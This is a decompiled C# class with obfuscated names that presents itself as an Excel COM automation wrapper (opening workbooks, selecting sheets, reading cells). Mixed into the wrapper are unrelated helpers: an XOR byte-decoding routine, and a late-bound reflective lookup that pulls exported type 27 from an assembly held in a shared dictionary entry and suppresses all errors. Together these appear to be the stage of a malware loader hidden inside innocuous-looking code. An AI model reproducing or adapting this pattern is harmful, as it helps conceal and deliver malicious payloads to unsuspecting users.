using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Px9;
using Qm75;
using Tx2e;
using o6MX;
using s3G8;

namespace Qk8;

public class t8X
{
	private Aq1e _oXls;

	private r9HF _oWBook;

	private Lc3b _oSheet;

	public Aq1e OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public r9HF OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Lc3b OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public t8X()
	{
		_oXls = (Aq1e)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void o0N(string b7Q, bool d2D)
	{
		OWBook = OXls.Workbooks.Open(b7Q, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = d2D;
	}

	internal static bool g7Q()
	{
		try
		{
			try
			{
				Type type = (Type)Cq8(RuntimeHelpers.GetObjectValue(s0K.mDic["Deep"]));
				if (Operators.CompareString(type.Name, s0K.mDic[s0K.tName].ToString(), false) == 0)
				{
					s0K.mDic.Add(s0K.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Cj8(string Wo1)
	{
		OSheet = (Lc3b)OWBook.Sheets[Wo1];
	}

	public Dg5c e8B(int d5C, int Ke7)
	{
		return (Dg5c)OSheet.Cells[d5C, Ke7];
	}

	public void Dk5(bool Ni4)
	{
		if (OWBook != null)
		{
			OWBook.Close(Ni4, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Aq1e a1H = OXls;
		k7C(ref a1H);
		OXls = a1H;
	}

	internal static byte Jq5(byte Dk3, byte[] Lp5, int x1H, int Tx4)
	{
		Dk3 = (byte)(Dk3 ^ checked((byte)(Lp5[unchecked(Tx4 % Lp5.Length)] ^ ((Tx4 + unchecked(x1H % Lp5.Length)) & x1H))));
		return Dk3;
	}

	private static void k7C<Xw3>(ref Xw3 a1H, bool j7M = false) where Xw3 : class
	{
		if (a1H == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(a1H))
			{
				if (j7M)
				{
					Marshal.FinalReleaseComObject(a1H);
				}
				else
				{
					Marshal.ReleaseComObject(a1H);
				}
			}
		}
		finally
		{
			a1H = null;
		}
	}

	internal static object Cq8(object n3Q)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(n3Q, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
